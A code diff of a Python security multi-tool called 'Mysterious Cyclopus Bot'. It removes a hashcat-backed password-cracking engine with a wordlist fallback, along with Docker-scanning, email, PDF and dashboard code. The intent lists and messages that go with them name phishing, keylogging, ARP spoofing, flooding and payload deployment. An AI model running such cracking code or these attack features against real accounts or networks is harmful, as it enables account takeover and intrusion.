         mac = mac_address.upper()
         mac = mac.replace('-', ':')
         mac = mac.replace('.', ':')
+        
+        db_info = self.db.get_mac_info(mac)
+        if db_info:
+            return db_info
         
         vendor = self._get_vendor(mac)
         ip = self._get_ip_from_mac(mac)
@@ -2792,1716 +4774,34 @@ class NATInfoEngine:
             return 'Unknown NAT Type'
 
 # =====================
-# CRACKING ENGINE
+# PLATFORM BOTS (Discord, Telegram, Slack, Signal, WhatsApp, Google Chat)
 # =====================
-class CrackingEngine:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-        self.running_jobs = {}
-        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
-        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
-    
-    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
-        job_id = str(uuid.uuid4())[:8]
-        wordlist = wordlist or self.wordlist_path
-        
-        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
-        
-        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
-        thread.daemon = True
-        thread.start()
-        
-        return job_id
-    
-    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
-        self.db.update_cracking_job(job_id, 'running')
-        
-        try:
-            hash_type_num = self._get_hash_type_num(hash_type)
-            
-            cmd = [
-                self.hashcat_path,
-                '-m', str(hash_type_num),
-                '-a', '0',
-                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
-                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
-                hash_value,
-                wordlist
-            ]
-            
-            if not shutil.which(self.hashcat_path):
-                result = self._crack_with_python(hash_type, hash_value, wordlist)
-                if result:
-                    self.db.update_cracking_job(job_id, 'completed', result, True)
-                else:
-                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
-                return
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            
-            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
-            if os.path.exists(result_file):
-                with open(result_file, 'r') as f:
-                    content = f.read().strip()
-                    if ':' in content:
-                        cracked = content.split(':', 1)[1]
-                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
-                    else:
-                        self.db.update_cracking_job(job_id, 'completed', content, True)
-            else:
-                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
-                
-        except subprocess.TimeoutExpired:
-            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
-        except Exception as e:
-            self.db.update_cracking_job(job_id, 'failed', str(e), False)
-    
-    def _get_hash_type_num(self, hash_type: str) -> int:
-        hash_types = {
-            'md5': 0,
-            'sha1': 100,
-            'sha256': 1400,
-            'sha512': 1700,
-            'ntlm': 1000,
-            'mysql': 200,
-            'mysql5': 300,
-            'postgres': 12,
-            'mssql': 131,
-            'bcrypt': 3200,
-        }
-        return hash_types.get(hash_type.lower(), 0)
-    
-    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
-        try:
-            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
-                for word in f:
-                    word = word.strip()
-                    if not word:
-                        continue
-                    
-                    if hash_type.lower() == 'md5':
-                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
-                            return word
-                    elif hash_type.lower() == 'sha1':
-                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
-                            return word
-                    elif hash_type.lower() == 'sha256':
-                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
-                            return word
-                    elif hash_type.lower() == 'sha512':
-                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
-                            return word
-            return None
-        except:
-            return None
-    
-    def get_job_status(self, job_id: str) -> Optional[Dict]:
-        jobs = self.db.get_cracking_jobs()
-        for job in jobs:
-            if job['job_id'] == job_id:
-                return dict(job)
-        return None
-    
-    def get_all_jobs(self) -> List[Dict]:
-        return self.db.get_cracking_jobs()
-
-# =====================
-# DOCKER SCANNER
-# =====================
-class DockerScanner:
-    def __init__(self, db: DatabaseManager):
-        self.db = db
-    
-    def scan_image(self, image: str) -> Dict:
-        start_time = time.time()
-        try:
-            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
-            scan_time = time.time() - start_time
-            
-            vulnerabilities = self._parse_vulnerabilities(result.stdout)
-            severity = self._determine_severity(vulnerabilities)
-            
-            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
-            
-            return {
-                'success': result.returncode == 0,
-                'image': image,
-                'vulnerabilities': vulnerabilities,
-                'severity': severity,
-                'scan_time': scan_time,
-                'output': result.stdout[:2000]
-            }
-        except subprocess.TimeoutExpired:
-            return {'success': False, 'error': 'Scan timed out', 'image': image}
-        except Exception as e:
-            return {'success': False, 'error': str(e), 'image': image}
-    
-    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
-        vulns = []
-        for line in output.split('\n'):
-            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
-                parts = line.split()
-                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
-                vulns.append({'severity': severity, 'description': line.strip()})
-        return vulns
-    
-    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
-        if any(v.get('severity') == 'critical' for v in vulnerabilities):
-            return 'critical'
-        if any(v.get('severity') == 'high' for v in vulnerabilities):
-            return 'high'
-        if vulnerabilities:
-            return 'medium'
-        return 'low'
-    
-    def docker_info(self) -> Dict:
-        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
-        return {'success': result.returncode == 0, 'output': result.stdout}
-    
-    def docker_ps(self) -> Dict:
-        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
-        return {'success': result.returncode == 0, 'output': result.stdout}
-    
-    def docker_images(self) -> Dict:
-        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
-        return {'success': result.returncode == 0, 'output': result.stdout}
-
-# =====================
-# EMAIL COMPOSER ENGINE
-# =====================
-class EmailComposerEngine:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-        self.smtp_server = config.get('email.smtp_server', '')
-        self.smtp_port = config.get('email.smtp_port', 587)
-        self.smtp_username = config.get('email.smtp_username', '')
-        self.smtp_password = config.get('email.smtp_password', '')
-        self.from_email = config.get('email.from_email', '')
-        self.tls = config.get('email.tls', True)
-    
-    def compose_email(self, to: str, subject: str, body: str, 
-                      from_email: str = None, html: bool = False,
-                      attachments: List[str] = None) -> EmailMessage:
-        email_msg = EmailMessage(
-            to=to,
-            subject=subject,
-            body=body,
-            from_email=from_email or self.from_email,
-            attachments=attachments or [],
-            html=html,
-            status="draft"
-        )
-        self.db.save_email(email_msg)
-        return email_msg
-    
-    def send_email(self, email_id: int) -> Dict[str, Any]:
-        emails = self.db.get_emails(limit=100)
-        email_data = next((e for e in emails if e['id'] == email_id), None)
-        
-        if not email_data:
-            return {'success': False, 'error': f'Email {email_id} not found'}
-        
-        if email_data['status'] == 'sent':
-            return {'success': False, 'error': 'Email already sent'}
-        
-        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
-            return {'success': False, 'error': 'SMTP server not configured'}
-        
-        try:
-            msg = MIMEMultipart()
-            msg['From'] = email_data['from_address']
-            msg['To'] = email_data['to_address']
-            msg['Subject'] = email_data['subject']
-            
-            if email_data['html']:
-                msg.attach(MIMEText(email_data['body'], 'html'))
-            else:
-                msg.attach(MIMEText(email_data['body'], 'plain'))
-            
-            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
-            for attachment_path in attachments:
-                if os.path.exists(attachment_path):
-                    with open(attachment_path, 'rb') as f:
-                        part = MIMEBase('application', 'octet-stream')
-                        part.set_payload(f.read())
-                        encoders.encode_base64(part)
-                        part.add_header(
-                            'Content-Disposition',
-                            f'attachment; filename={os.path.basename(attachment_path)}'
-                        )
-                        msg.attach(part)
-            
-            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
-                if self.tls:
-                    server.starttls()
-                server.login(self.smtp_username, self.smtp_password)
-                server.send_message(msg)
-            
-            self.db.conn.execute(
-                "UPDATE email_messages SET status = 'sent', sent_at = CURRENT_TIMESTAMP WHERE id = ?",
-                (email_id,)
-            )
-            self.db.conn.commit()
-            
-            return {
-                'success': True,
-                'message': f'Email sent to {email_data["to_address"]}',
-                'email_id': email_id
-            }
-            
-        except Exception as e:
-            self.db.conn.execute(
-                "UPDATE email_messages SET status = 'failed' WHERE id = ?",
-                (email_id,)
-            )
-            self.db.conn.commit()
-            return {'success': False, 'error': str(e)}
-    
-    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
-        return self.db.get_emails(status, limit)
-
-# =====================
-# PDF REPORT GENERATOR
-# =====================
-class PDFReportGenerator:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-        self.pdf_available = PDF_AVAILABLE
-    
-    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
-        if not self.pdf_available:
-            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
-        
-        try:
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"cyclopus_report_{target}_{timestamp}.pdf"
-            filepath = os.path.join(PDF_REPORTS_DIR, filename)
-            
-            doc = SimpleDocTemplate(
-                filepath,
-                pagesize=A4,
-                rightMargin=72,
-                leftMargin=72,
-                topMargin=72,
-                bottomMargin=72
-            )
-            
-            styles = getSampleStyleSheet()
-            title_style = ParagraphStyle(
-                'CustomTitle',
-                parent=styles['Heading1'],
-                fontSize=24,
-                textColor=colors.HexColor('#FF7A1A'),
-                alignment=0,
-                spaceAfter=30
-            )
-            
-            story = []
-            
-            story.append(Paragraph(f"🐙 Mysterious Cyclopus Security Report", title_style))
-            story.append(Paragraph(f"Title: {title}", styles['Heading2']))
-            story.append(Paragraph(f"Target: {target}", styles['Normal']))
-            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
-            story.append(Spacer(1, 20))
-            
-            story.append(Paragraph("Executive Summary", styles['Heading2']))
-            summary = f"This report presents a comprehensive security analysis of <b>{target}</b>."
-            story.append(Paragraph(summary, styles['Normal']))
-            story.append(Spacer(1, 12))
-            
-            for key, value in analysis.items():
-                if isinstance(value, dict):
-                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
-                    for sub_key, sub_value in value.items():
-                        if not isinstance(sub_value, (dict, list)):
-                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
-                    story.append(Spacer(1, 10))
-            
-            if 'recommendations' in analysis:
-                story.append(Paragraph("Recommendations", styles['Heading2']))
-                for rec in analysis['recommendations']:
-                    story.append(Paragraph(f"• {rec}", styles['Normal']))
-            
-            story.append(Spacer(1, 30))
-            story.append(Paragraph(
-                f"Report generated by Mysterious Cyclopus Bot v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                styles['Italic']
-            ))
-            
-            doc.build(story)
-            
-            report = PDFReport(
-                title=title,
-                target=target,
-                analysis=analysis,
-                timestamp=datetime.datetime.now().isoformat(),
-                file_path=filepath,
-                status="generated"
-            )
-            self.db.save_pdf_report(report)
-            
-            return {
-                'success': True,
-                'file_path': filepath,
-                'message': f'PDF report generated: {filename}'
-            }
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-    
-    def get_reports(self, limit: int = 20) -> List[Dict]:
-        return self.db.get_pdf_reports(limit)
-
-# =====================
-# TRANSFORMER ENGINE
-# =====================
-class TransformerEngine:
-    def __init__(self, config: ConfigManager):
-        self.config = config
-        self.max_input_length = config.get('transformer.max_input_length', 1000)
-        self.cache_size = config.get('transformer.cache_size', 100)
-        self.command_cache = {}
-        self.intent_patterns = {
-            'ping': ['ping', 'pong', 'reach', 'connectivity', 'icmp'],
-            'scan': ['scan', 'nmap', 'port', 'vulnerability', 'discover', 'probe'],
-            'ssh': ['ssh', 'secure shell', 'remote', 'shell', 'connect'],
-            'traffic': ['traffic', 'generate', 'flood', 'dos', 'ddos', 'attack'],
-            'phishing': ['phish', 'fake', 'clone', 'credentials', 'capture', 'phishing'],
-            'crack': ['crack', 'hash', 'password', 'brute', 'force', 'decrypt'],
-            'arp': ['arp', 'spoof', 'poison', 'redirect', 'arp'],
-            'keylogger': ['keylog', 'logger', 'keystroke', 'capture', 'keyboard'],
-            'ip': ['ip', 'address', 'network', 'block', 'unblock', 'firewall'],
-            'mac': ['mac', 'address', 'vendor', 'oui', 'mac'],
-            'nat': ['nat', 'translation', 'public', 'private', 'gateway'],
-            'system': ['system', 'status', 'info', 'memory', 'cpu', 'process'],
-            'deploy': ['deploy', 'deployment', 'payload', 'deliver', 'execute'],
-            'domain': ['domain', 'host', 'dns', 'record', 'name', 'website'],
-            'monitor': ['monitor', 'watch', 'observe', 'track', 'sniff'],
-            'agent': ['agent', 'bot', 'automation', 'schedule', 'task'],
-            'report': ['report', 'log', 'history', 'analytics', 'stats'],
-            'email': ['email', 'mail', 'compose', 'send', 'message'],
-            'docker': ['docker', 'container', 'image', 'scan', 'benchmark'],
-            'curl': ['curl', 'http', 'request', 'post', 'get'],
-            'netcat': ['netcat', 'nc', 'connect', 'listen'],
-            'traceroute': ['traceroute', 'tracert', 'route', 'hop'],
-            'whois': ['whois', 'domain', 'registrar', 'dns'],
-            'dns': ['dns', 'dig', 'nslookup', 'resolve'],
-            'wget': ['wget', 'download', 'fetch', 'get'],
-            'help': ['help', '?', 'guide', 'manual', 'docs']
-        }
-        self.processed_commands = deque(maxlen=self.cache_size)
-    
-    def process_input(self, input_text: str) -> Dict:
-        input_text = input_text.strip().lower()
-        
-        if input_text in self.command_cache:
-            return self.command_cache[input_text]
-        
-        tokens = input_text.split()
-        if not tokens:
-            return {'command': 'help', 'confidence': 1.0, 'tokens': []}
-        
-        intent = self._detect_intent(input_text, tokens)
-        params = self._extract_parameters(input_text, tokens)
-        
-        result = {
-            'command': intent,
-            'confidence': self._calculate_confidence(input_text, intent),
-            'tokens': tokens,
-            'params': params,
-            'original': input_text
-        }
-        
-        if len(self.processed_commands) < self.cache_size:
-            self.command_cache[input_text] = result
-            self.processed_commands.append(input_text)
-        
-        return result
-    
-    def _detect_intent(self, text: str, tokens: List[str]) -> str:
-        for intent, patterns in self.intent_patterns.items():
-            for pattern in patterns:
-                if pattern in text:
-                    return intent
-        return 'unknown'
-    
-    def _extract_parameters(self, text: str, tokens: List[str]) -> Dict:
-        params = {}
-        
-        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
-        ips = re.findall(ip_pattern, text)
-        if ips:
-            params['ip'] = ips[0]
-            if len(ips) > 1:
-                params['ip_list'] = ips
-        
-        domain_pattern = r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b'
-        domains = re.findall(domain_pattern, text)
-        if domains:
-            params['domain'] = domains[0]
-        
-        number_pattern = r'\b\d+\b'
-        numbers = re.findall(number_pattern, text)
-        if numbers:
-            params['numbers'] = [int(n) for n in numbers]
-        
-        port_pattern = r'(?:port|p)\s*[:=]?\s*(\d+)'
-        port_match = re.search(port_pattern, text)
-        if port_match:
-            params['port'] = int(port_match.group(1))
-        
-        return params
-    
-    def _calculate_confidence(self, text: str, intent: str) -> float:
-        if intent == 'unknown':
-            return 0.0
-        
-        patterns = self.intent_patterns.get(intent, [])
-        matches = sum(1 for pattern in patterns if pattern in text)
-        if matches == 0:
-            return 0.0
-        
-        confidence = matches / len(patterns)
-        text_length = len(text)
-        if text_length > 50:
-            confidence *= 0.9
-        elif text_length < 10:
-            confidence *= 0.8
-        
-        return min(1.0, confidence)
-    
-    def generate_response(self, processed: Dict, command_result: Dict) -> Dict:
-        if not processed or not command_result:
-            return command_result
-        
-        output = command_result.get('output', '')
-        intent = processed.get('command', 'unknown')
-        
-        contextual = {
-            'ping': '🏓 Ping completed successfully',
-            'scan': '🔍 Scan completed successfully',
-            'ssh': '🔌 SSH connection established',
-            'traffic': '🚀 Traffic generated successfully',
-            'phishing': '🎣 Phishing link generated',
-            'crack': '🔓 Crack completed',
-            'arp': '🕸️ ARP spoofing completed',
-            'keylogger': '⌨️ Keylogger started',
-            'ip': '🔒 IP management completed',
-            'mac': '📡 MAC address information',
-            'nat': '🌐 NAT information retrieved',
-            'system': '💻 System information retrieved',
-            'deploy': '📦 Deployment completed',
-            'domain': '🌐 Domain operation completed',
-            'monitor': '📡 Monitoring started',
-            'agent': '🤖 Agent operation completed',
-            'report': '📊 Report generated',
-            'email': '📧 Email operation completed',
-            'docker': '🐳 Docker operation completed',
-            'curl': '🌐 HTTP request completed',
-            'netcat': '🔌 Netcat operation completed',
-            'traceroute': '🗺️ Traceroute completed',
-            'whois': '📋 WHOIS lookup completed',
-            'dns': '🌐 DNS resolution completed',
-            'wget': '⬇️ Download completed',
-            'help': '📖 Help information displayed'
-        }
-        
-        if intent in contextual and command_result.get('success'):
-            output = f"{contextual[intent]}\n\n{output}"
-        
-        command_result['output'] = output
-        return command_result
-
-# =====================
-# WEB DASHBOARD
-# =====================
-class WebDashboard:
-    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
-        self.handler = handler
-        self.db = db
-        self.config = config
-        self.app = None
-        self.socketio = None
-        self.running = False
-    
-    def create_app(self):
-        if not WEB_AVAILABLE:
-            return None
-        
-        app = Flask(__name__)
-        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
-        CORS(app)
-        
-        socketio = SocketIO(app, cors_allowed_origins="*")
-        
-        # Orange & White Cyclopus Theme Template
-        TEMPLATE = '''
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>🐙 MYSTERIOUS CYCLOPUS // Command Console</title>
-            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-            <style>
-                :root{
-                    --white:#ffffff;
-                    --off-white:#fff8f2;
-                    --paper:#fffdfb;
-                    --orange:#ff7a1a;
-                    --orange-deep:#e8600a;
-                    --orange-light:#ffb066;
-                    --orange-glow:#ffa04d;
-                    --ink:#2b2320;
-                    --ink-soft:#6b5c52;
-                    --line:#ffd9b3;
-                    --shadow: 0 10px 30px rgba(232,96,10,0.12);
-                    --shadow-lg: 0 20px 60px rgba(232,96,10,0.18);
-                    --radius: 18px;
-                }
-                
-                *{ box-sizing: border-box; }
-                
-                html,body{
-                    margin:0; padding:0;
-                    background: var(--off-white);
-                    color: var(--ink);
-                    font-family: 'Courier New', 'Consolas', monospace;
-                    overflow-x:hidden;
-                }
-                
-                body{
-                    background-image:
-                        radial-gradient(circle at 15% 20%, rgba(255,122,26,0.08), transparent 40%),
-                        radial-gradient(circle at 85% 80%, rgba(255,122,26,0.10), transparent 45%),
-                        linear-gradient(180deg, #fffefc 0%, #fff6ec 100%);
-                    min-height:100vh;
-                }
-                
-                .wrap{
-                    max-width: 1400px;
-                    margin: 0 auto;
-                    padding: 28px 24px 60px;
-                }
-                
-                header.top{
-                    display:flex;
-                    align-items:center;
-                    justify-content:space-between;
-                    gap: 20px;
-                    padding: 18px 26px;
-                    background: var(--paper);
-                    border: 2px solid var(--line);
-                    border-radius: var(--radius);
-                    box-shadow: var(--shadow);
-                    margin-bottom: 26px;
-                    position:relative;
-                    overflow:hidden;
-                }
-                
-                header.top::before{
-                    content:"";
-                    position:absolute;
-                    top:-40%; left:-10%;
-                    width:220px; height:220px;
-                    background: radial-gradient(circle, rgba(255,122,26,0.18), transparent 70%);
-                    border-radius:50%;
-                    pointer-events:none;
-                }
-                
-                .brand{
-                    display:flex;
-                    align-items:center;
-                    gap:16px;
-                }
-                
-                .brand .logo-dot{
-                    width:46px; height:46px;
-                    border-radius:50%;
-                    background: radial-gradient(circle at 35% 30%, var(--orange-light), var(--orange-deep));
-                    box-shadow: 0 0 0 4px #fff, 0 0 0 6px var(--orange-light), 0 6px 18px rgba(232,96,10,0.4);
-                    position:relative;
-                    flex-shrink:0;
-                    animation: pulseDot 2.6s ease-in-out infinite;
-                }
-                .brand .logo-dot::after{
-                    content:"";
-                    position:absolute;
-                    inset:12px;
-                    border-radius:50%;
-                    background: #1a1310;
-                    box-shadow: inset 0 0 0 2px rgba(255,255,255,0.4);
-                }
-                @keyframes pulseDot{
-                    0%,100%{ transform: scale(1); }
-                    50%{ transform: scale(1.12); }
-                }
-                
-                .brand h1{
-                    margin:0;
-                    font-size: 26px;
-                    letter-spacing: 3px;
-                    color: var(--orange-deep);
-                    text-shadow: 0 2px 0 #fff, 0 0 18px rgba(255,122,26,0.25);
-                }
-                .brand .tagline{
-                    margin:2px 0 0;
-                    font-size: 11px;
-                    letter-spacing: 4px;
-                    color: var(--ink-soft);
-                    text-transform: uppercase;
-                }
-                
-                .status-pill{
-                    display:flex;
-                    align-items:center;
-                    gap:10px;
-                    background: #fff3e6;
-                    border: 1px solid var(--line);
-                    padding: 8px 16px;
-                    border-radius: 999px;
-                    font-size: 12px;
-                    color: var(--orange-deep);
-                    font-weight: bold;
-                    letter-spacing: 1px;
-                }
-                .status-pill .blip{
-                    width:9px; height:9px;
-                    border-radius:50%;
-                    background: #35c76b;
-                    box-shadow: 0 0 8px #35c76b;
-                    animation: blink 1.4s infinite;
-                }
-                @keyframes blink{
-                    0%,100%{ opacity:1; }
-                    50%{ opacity:0.25; }
-                }
-                
-                .grid{
-                    display:grid;
-                    grid-template-columns: 340px 1fr;
-                    gap: 24px;
-                    align-items:start;
-                }
-                
-                @media (max-width: 980px){
-                    .grid{ grid-template-columns: 1fr; }
-                }
-                
-                .panel{
-                    background: var(--paper);
-                    border: 2px solid var(--line);
-                    border-radius: var(--radius);
-                    box-shadow: var(--shadow);
-                    padding: 20px;
-                    position:relative;
-                }
-                
-                .panel h2{
-                    margin:0 0 14px;
-                    font-size: 14px;
-                    letter-spacing: 2px;
-                    color: var(--orange-deep);
-                    text-transform: uppercase;
-                    display:flex;
-                    align-items:center;
-                    gap:8px;
-                }
-                .panel h2::before{
-                    content:"";
-                    width:8px; height:8px;
-                    background: var(--orange);
-                    border-radius:2px;
-                    display:inline-block;
-                    transform: rotate(45deg);
-                }
-                
-                .octo-stage{
-                    display:flex;
-                    flex-direction:column;
-                    align-items:center;
-                    justify-content:center;
-                    min-height: 320px;
-                    position:relative;
-                    background:
-                        radial-gradient(circle at 50% 30%, #fff3e6 0%, #fff 70%);
-                    border-radius: 14px;
-                    border: 1px dashed var(--line);
-                    overflow:hidden;
-                    padding: 10px;
-                }
-                
-                .bubble{
-                    position:absolute;
-                    bottom:-20px;
-                    border-radius:50%;
-                    background: rgba(255,122,26,0.12);
-                    border: 1px solid rgba(255,122,26,0.35);
-                    animation: floatUp linear infinite;
-                }
-                @keyframes floatUp{
-                    0%{ transform: translateY(0) translateX(0); opacity:0; }
-                    10%{ opacity:1; }
-                    100%{ transform: translateY(-340px) translateX(var(--drift,10px)); opacity:0; }
-                }
-                
-                svg#octopus{
-                    width: 240px;
-                    height: 240px;
-                    filter: drop-shadow(0 12px 20px rgba(232,96,10,0.25));
-                }
-                
-                .tentacle{
-                    transform-origin: top center;
-                    animation: sway 3.2s ease-in-out infinite;
-                }
-                .tentacle:nth-child(1){ animation-delay: 0s; }
-                .tentacle:nth-child(2){ animation-delay: 0.15s; }
-                .tentacle:nth-child(3){ animation-delay: 0.3s; }
-                .tentacle:nth-child(4){ animation-delay: 0.45s; }
-                .tentacle:nth-child(5){ animation-delay: 0.6s; }
-                .tentacle:nth-child(6){ animation-delay: 0.75s; }
-                
-                @keyframes sway{
-                    0%,100%{ transform: rotate(-6deg); }
-                    50%{ transform: rotate(6deg); }
-                }
-                
-                .eye-pupil{
-                    animation: lookAround 6s ease-in-out infinite;
-                }
-                @keyframes lookAround{
-                    0%,100%{ transform: translate(0,0); }
-                    20%{ transform: translate(3px,-2px); }
-                    40%{ transform: translate(-3px,2px); }
-                    60%{ transform: translate(2px,2px); }
-                    80%{ transform: translate(-2px,-1px); }
-                }
-                
-                .eye-lid{
-                    animation: blinkEye 5s infinite;
-                    transform-origin: center;
-                }
-                @keyframes blinkEye{
-                    0%,92%,100%{ transform: scaleY(0); }
-                    95%{ transform: scaleY(1); }
-                }
-                
-                .octo-caption{
-                    margin-top: 10px;
-                    font-size: 11px;
-                    letter-spacing: 2px;
-                    color: var(--ink-soft);
-                    text-transform: uppercase;
-                    text-align:center;
-                }
-                
-                .octo-caption b{ color: var(--orange-deep); }
-                
-                .vitals{
-                    margin-top: 18px;
-                    display:flex;
-                    flex-direction:column;
-                    gap: 10px;
-                }
-                .vital-row{
-                    display:flex;
-                    justify-content:space-between;
-                    align-items:center;
-                    font-size: 12px;
-                    padding: 8px 10px;
-                    background: #fff6ec;
-                    border: 1px solid var(--line);
-                    border-radius: 8px;
-                }
-                .vital-row span.label{ color: var(--ink-soft); letter-spacing: 1px; }
-                .vital-row span.val{ color: var(--orange-deep); font-weight:bold; }
-                
-                .console{
-                    display:flex;
-                    flex-direction:column;
-                    gap: 16px;
-                }
-                
-                .terminal{
-                    background: #1c140e;
-                    border-radius: 14px;
-                    border: 2px solid var(--orange-deep);
-                    box-shadow: var(--shadow-lg), inset 0 0 40px rgba(255,122,26,0.06);
-                    overflow:hidden;
-                }
-                
-                .term-titlebar{
-                    display:flex;
-                    align-items:center;
-                    gap:8px;
-                    padding: 10px 14px;
-                    background: linear-gradient(180deg, #2a1d14, #1c140e);
-                    border-bottom: 1px solid rgba(255,122,26,0.25);
-                }
-                .term-titlebar .dot{
-                    width:11px; height:11px; border-radius:50%;
-                }
-                .dot.red{ background:#ff5f57; }
-                .dot.yellow{ background:#febc2e; }
-                .dot.green{ background:#28c840; }
-                .term-titlebar .term-name{
-                    margin-left: 8px;
-                    font-size: 12px;
-                    color: var(--orange-light);
-                    letter-spacing: 2px;
-                }
-                
-                #term-output{
-                    height: 360px;
-                    overflow-y: auto;
-                    padding: 16px 18px;
-                    font-size: 13px;
-                    line-height: 1.6;
-                    color: #ffd9ae;
-                }
-                #term-output::-webkit-scrollbar{ width: 8px; }
-                #term-output::-webkit-scrollbar-thumb{ background: var(--orange-deep); border-radius: 4px; }
-                #term-output::-webkit-scrollbar-track{ background: #241a12; }
-                
-                .line{ margin-bottom: 4px; white-space: pre-wrap; word-break: break-word; }
-                .line .prompt-tag{ color: #ff8c2e; }
-                .line.system{ color: #9adfb0; }
-                .line.warn{ color: #ffcf6b; }
-                .line.err{ color: #ff7a7a; }
-                .line.info{ color: #ffd9ae; }
-                .line.echo{ color: #ffffff; }
-                
-                .term-input-row{
-                    display:flex;
-                    align-items:center;
-                    gap:10px;
-                    padding: 12px 16px;
-                    background: #24190f;
-                    border-top: 1px solid rgba(255,122,26,0.25);
-                }
-                .term-input-row .caret{
-                    color: var(--orange);
-                    font-weight:bold;
-                }
-                #term-input{
-                    flex:1;
-                    background: transparent;
-                    border: none;
-                    outline: none;
-                    color: #fff3e6;
-                    font-family: inherit;
-                    font-size: 14px;
-                    letter-spacing: 0.5px;
-                }
-                #term-input::placeholder{ color: #7a5a41; }
-                
-                .quick-cmds{
-                    display:flex;
-                    flex-wrap:wrap;
-                    gap: 8px;
-                }
-                .quick-cmds button{
-                    background: #fff3e6;
-                    border: 1px solid var(--orange-light);
-                    color: var(--orange-deep);
-                    padding: 7px 14px;
-                    border-radius: 999px;
-                    font-size: 11px;
-                    letter-spacing: 1px;
-                    cursor:pointer;
-                    font-family: inherit;
-                    transition: all 0.15s ease;
-                }
-                .quick-cmds button:hover{
-                    background: var(--orange);
-                    color:#fff;
-                    transform: translateY(-2px);
-                    box-shadow: 0 6px 14px rgba(232,96,10,0.35);
-                }
-                
-                .charts-row{
-                    display:grid;
-                    grid-template-columns: 1.3fr 1fr;
-                    gap: 20px;
-                }
-                @media (max-width: 760px){
-                    .charts-row{ grid-template-columns: 1fr; }
-                }
-                
-                canvas{
-                    width:100%;
-                    display:block;
-                }
-                
-                .legend{
-                    display:flex;
-                    flex-wrap:wrap;
-                    gap: 10px 16px;
-                    margin-top: 12px;
-                    font-size: 11px;
-                }
-                .legend .item{
-                    display:flex;
-                    align-items:center;
-                    gap:6px;
-                    color: var(--ink-soft);
-                }
-                .legend .swatch{
-                    width:11px; height:11px;
-                    border-radius:3px;
-                    display:inline-block;
-                }
-                
-                .chart-foot{
-                    display:flex;
-                    justify-content:space-between;
-                    align-items:center;
-                    margin-top:10px;
-                }
-                .refresh-btn{
-                    background: var(--orange);
-                    border:none;
-                    color:#fff;
-                    padding: 8px 16px;
-                    border-radius: 8px;
-                    font-size: 11px;
-                    letter-spacing: 1px;
-                    cursor:pointer;
-                    font-family: inherit;
-                    box-shadow: 0 6px 14px rgba(232,96,10,0.3);
-                    transition: transform 0.15s ease;
-                }
-                .refresh-btn:hover{ transform: translateY(-2px); }
-                
-                footer{
-                    text-align:center;
-                    margin-top: 30px;
-                    font-size: 11px;
-                    color: var(--ink-soft);
-                    letter-spacing: 2px;
-                }
-                footer b{ color: var(--orange-deep); }
-                
-                .glow-underline{
-                    height:3px;
-                    width:60px;
-                    margin: 8px auto 0;
-                    background: linear-gradient(90deg, transparent, var(--orange), transparent);
-                    border-radius: 2px;
-                }
-            </style>
-        </head>
-        <body>
-        
-        <div class="wrap">
-        
-          <header class="top">
-            <div class="brand">
-              <div class="logo-dot"></div>
-              <div>
-                <h1>MYSTERIOUS CYCLOPUS</h1>
-                <p class="tagline">Deep-Sea Command &amp; Data Console</p>
-              </div>
-            </div>
-            <div class="status-pill">
-              <span class="blip"></span>
-              <span id="clock-status">SYSTEM ONLINE</span>
-            </div>
